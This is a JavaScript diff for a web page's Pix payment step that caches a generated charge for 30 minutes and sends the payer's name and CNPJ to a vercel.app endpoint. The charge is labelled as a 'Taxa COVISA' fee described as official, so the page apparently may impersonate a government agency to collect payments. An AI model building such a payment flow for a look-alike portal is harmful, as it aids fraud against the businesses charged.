@@ -1465,7 +1465,7 @@
 
             const margemEsquerdaTextos = 22;  
             const margemEsquerdaDados = 200;  
-            let alturaAtual = 544;            
+            let alturaAtual = 544;             
             const espacoEntreLinhas = 10;   
             const tamanhoLetra = 10;         
 
@@ -1546,9 +1546,9 @@
     }
 
     let timerInterval;
-    function iniciarCronometroPix() {
+    function iniciarCronometroPix(tempoInicial) {
       clearInterval(timerInterval);
-      let time = 1800; 
+      let time = tempoInicial !== undefined ? tempoInicial : 1800; 
       let display = document.getElementById('cronometro-pix');
       timerInterval = setInterval(() => {
         let minutes = parseInt(time / 60, 10);
@@ -1988,9 +1988,11 @@
                       document.getElementById('valor-cobrado').innerText = valorFormatado;
                       valorPixParaComprovante = valorFormatado;
 
-                      // --- INÍCIO DA INTEGRAÇÃO ELITEPAY VIA VERCEL ---
+                      // --- INÍCIO DA INTEGRAÇÃO ELITEPAY VIA VERCEL (COM BLOQUEIO DE 30 MIN) ---
                       document.getElementById('pix-copia-cola').value = "Gerando Pix oficial, aguarde...";
                       document.querySelector('.qr-container img').src = "https://i.gifer.com/ZKZg.gif"; 
+
+                      let tempoRestanteTimer = 1800;
 
                       try {
                           let valorCobrado = parseFloat(valorLimpo.replace(',', '.'));
@@ -1998,18 +2000,45 @@
                           // CHAMANDO A API DO VERCEL QUE CRIAMOS
                           const LINK_DO_VERCEL = 'https://portal-vigilancia-one.vercel.app/api/pix.js';
 
-                          const responsePix = await fetch(LINK_DO_VERCEL, {
-                              method: 'POST',
-                              headers: { 'Content-Type': 'application/json' },
-                              body: JSON.stringify({
-                                  amount: valorCobrado,
-                                  description: `Taxa COVISA - Processo ${window.idPedidoConsultaAtual}`,
-                                  payerName: pedido.nome,
-                                  payerDocument: pedido.cnpj.replace(/\D/g, '') // Manda só os números
-                              })
-                          });
+                          let chaveCache = 'pix_gerado_' + pedido.cnpj.replace(/\D/g, '');
+                          let pixCache = localStorage.getItem(chaveCache);
+                          let dadosPix = null;
+                          let usarCache = false;
 
-                          const dadosPix = await responsePix.json();
+                          if (pixCache) {
+                              let parseCache = JSON.parse(pixCache);
+                              let tempoPassado = Math.floor((Date.now() - parseCache.timestamp) / 1000);
+                              
+                              if (tempoPassado < 1800) {
+                                  dadosPix = parseCache.dados;
+                                  tempoRestanteTimer = 1800 - tempoPassado;
+                                  usarCache = true;
+                              } else {
+                                  localStorage.removeItem(chaveCache);
+                              }
+                          }
+
+                          if (!usarCache) {
+                              const responsePix = await fetch(LINK_DO_VERCEL, {
+                                  method: 'POST',
+                                  headers: { 'Content-Type': 'application/json' },
+                                  body: JSON.stringify({
+                                      amount: valorCobrado,
+                                      description: `Taxa COVISA - Processo ${window.idPedidoConsultaAtual}`,
+                                      payerName: pedido.nome,
+                                      payerDocument: pedido.cnpj.replace(/\D/g, '') // Manda só os números
+                                  })
+                              });
+
+                              dadosPix = await responsePix.json();
+
+                              if (dadosPix.success) {
+                                  localStorage.setItem(chaveCache, JSON.stringify({
+                                      timestamp: Date.now(),
+                                      dados: dadosPix
+                                  }));
+                              }
+                          }
 
                           if (dadosPix.success) {
                               document.getElementById('pix-copia-cola').value = dadosPix.copyPaste;
@@ -2078,7 +2107,7 @@
 
                       cnpjParaComprovante = cnpj;
                       atualizarBarraProgresso(3); window.updateVisualSteps(3);
-                      iniciarCronometroPix(); 
+                      iniciarCronometroPix(tempoRestanteTimer); 
                   }
               }
           } catch(err) {
